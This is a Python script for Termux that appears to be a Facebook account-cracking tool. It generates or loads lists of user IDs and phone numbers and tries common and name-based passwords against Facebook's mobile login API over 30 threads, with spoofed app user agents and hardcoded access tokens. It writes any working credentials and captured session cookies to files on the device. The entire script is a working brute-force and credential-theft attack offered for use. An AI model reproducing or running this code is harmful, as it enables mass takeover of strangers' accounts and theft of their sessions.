""" SOURCE BY ARAFAT """
""" EKTA GIT A FOLLOW DIYO """
#--------------------------------------------------------------------------#

fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess, hashlib 
	from string import *
	import subprocess
	from io import BytesIO
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python FUCKR_enc.py')
try: import pycurl
except ModuleNotFoundError: os.system('pip install pycurl')
os.system('git pull -q')
try:from fake_useragent import UserAgent
except ModuleNotFoundError:os.system('pip install fake-useragent')
#print(' [•] Join Our Group')
#os.system('xdg-open https://github.com/ARAFAT-TERMUX')
#input(' [•] Press Enter ')
#os.system('xdg-open https://github.com/ARAFAT-TERMUX')

try:
	ah = os.listdir('/sdcard')
	if ['Android'] in ah:pass
except:print(' \n allow storage permission ...!');time.sleep(1);os.system('termux-setup-storage');exit()

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
IPGD ='\33[1;32m'


sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}


def u_a():
    g = "[FBAN/FB4A;FBAV/168.0.0.40.90;FBBV/103682747;FBLC/en_US;FBRV/0;FBCR/Jio;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A315F;FBSV/10;FBOP/1;FBCA/arm64-v8a;]"
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";"+g
    

logo=(f"""\
   ╔═══╗╔═══╗╔═══╗╔═══╗╔═╗╔═╗
║╔═╗║║╔═╗║║╔═╗║║╔═╗║║║╚╝║║
║║ ║║║╚═╝║║╚══╗║║ ║║║╔╗╔╗║
║╚═╝║║╔╗╔╝╚══╗║║╚═╝║║║║║║║
║╔═╗║║║║╚╗║╚═╝║║╔═╗║║║║║║║
╚╝ ╚╝╚╝╚═╝╚═══╝╚╝ ╚╝╚╝╚╝╚╝
\033[1;37m----------------------------------------------
\033[1;96m Owner  : ARSAM
\033[1;92m Name   : 0.01
\033[1;93m Version:\033[1;93m 0."x"10.0 \033[1;93m
\033[1;97m Status : Perxnl-√√ 
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def pp():
	try:
			ky = open('/sdcard/Android/.nonmedia.js','r').read()
	except(FileNotFoundError):
			op = uuid.uuid1().hex.upper()
			open('/sdcard/Android/.nonmedia.js','w').write(op)
			pp()
	except(KeyError,OSError,IOError):
			linex()
			os.system('termux-setup-storage')
			print(' [×] allow storage permission ')
			pp()
	if len(ky) > 32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
	if len(ky) <32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
	else:
			pass
	clear()
	
    
def menu():
			pp();clear()
		#	linex()
			print(' [1] File cloning\n [2] Random cloning \n [3] join whatsap group \n [0] Exit menu')
			linex()
			xd=input(' Choose an option: ')
		#	os.system('xdg-open)
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				
				plist = []
				try:
					ps_limit = int(input(' How many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;32m exp: first last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				clear()
				print(' Do you went show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				clear()
				print(' [1] Method M1 \n [2] Method M2')
				linex()
				mth = input(' Choose : ')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' TOTAL IDS : \033[1;32m'+total_ids+f' ')
					print(' \033[1;37mAFTER 3 MINTES USE JAHAZ 🚩')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mth =='1':
							crack_submit.submit(api2,ids,names,passlist)
						elif mth =='2':
							crack_submit.submit(api,ids,names,passlist)
						else:
							crack_submit.submit(api,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python FUCKR_enc.py')
			elif xd in ['2','02']:
				pak()
			elif xd in ['3','03']:
				os.system('xdg-open https://chat.whatsapp.com/E9qcXs9EcwE7JAXW2l2hR3')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
				exit(' Option not found in menu...')

def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0306,0315,0335,0345')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as zain:
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
			print(' \033[1;37mThe process is running in the background')
			linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'khankhan123','khankhan','786786','khan123','khan12345','khan123456','khanbaba','khan786','khan1234','pak123','khan1122','khan12']
				zain.submit(rd1,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python FUCKR_enc.py')

def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [FUCKR-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/47.0.0.4444;FBBV/2299187;[FBAN/Orca-Android;FBAV/30.0.0.72.56;FBBV/11557663;FBDM/{density=1.6,width=540,height=960};FBLC/es_PK;FBCR/AF Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-J200F;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        uaa = "[FBAN/FB4A;FBAV/473.0.0.41.81;FBBV/332957690;FBDM/{density=2.5,width=1600,height=2536};FBLC/en_US;FBRV/0;FBCR/Samsung;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-T720;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        data = {
                                'adid': adid,
                                'format': 'json', 
                                'device_id': device_id,
                                'email': ids, 
                                'password': pas, 
                                'generate_analytics_claims': '1', 
                                'credentials_type': 'password', 
                                'source': 'login', 
                                'error_detail_type': 
                                'button_with_disabled', 
                                'enroll_misauth': 'false', 
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1', 
                                'locale': 'fa_AF', 'client_country_code': 'AF',
                                'fb_api_req_friendly_name': 'authenticate'}
                        headers={
                                'User-Agent':uaa,
                                'Accept-Encoding': 'gzip, deflate', 
                                'Accept': '*/*', 
                                'Connection': 'keep-alive', 
                                'Authorization':f'OAuth {accessToken}', 
                                'X-FB-Friendly-Name': 'authenticate', 
                                'X-FB-Connection-Type': 'unknown', 
                                'Content-Type': 'application/x-www-form-urlencoded', 
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [FUCKR-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/FUCKR-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/FUCKR-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        #print('\r\r\x1b[1;31m [FUCKR-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FUCKR-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:pass

def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [FUCKR-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/55.0.0.1843;FBBV/6009028;[FBAN/Orca-Android;FBAV/28.0.0.0.16;FBBV/6977650;FBDM/{density=2.0,width=540,height=960};FBLC/en_US;FBCR/Hotlink Internet;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.orca;FBDV/A33FW;FBSV/5.1;nullFBCA/armeabi-v7a:armeabi;]"
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": u_a(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Arsam-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Arsam-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/Arsam-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[FUCKR-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [Arsam-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Arsam-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/Arsam-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Arsam-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = 'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/76.0.0.3866;FBBV/6178213;[FBAN/Orca-Android;FBAV/35.0.0.72.45;FBBV/61279955;FBDM/{density=3.1,width=1440,height=2560};FBLC/uk_UA;FBCR/MyPeak Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G925I;FBSV/7.0;nullFBCA/armeabi-v7a:armeabi;]'
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        cn = random.randint(60,99)
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Accept": "*/*","Host": "graph.facebook.com","User-Agent": u_a(),"X-FB-Net-HNI": "25227","X-FB-SIM-HNI": "29752","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive","Content-Length":f"6{cn}"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [FUCKR-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/FUCKR-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/FUCKR-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Arsam-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [Arsam-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Arsam-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/Arsam-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass


if __name__ == "__main__":
	menu()
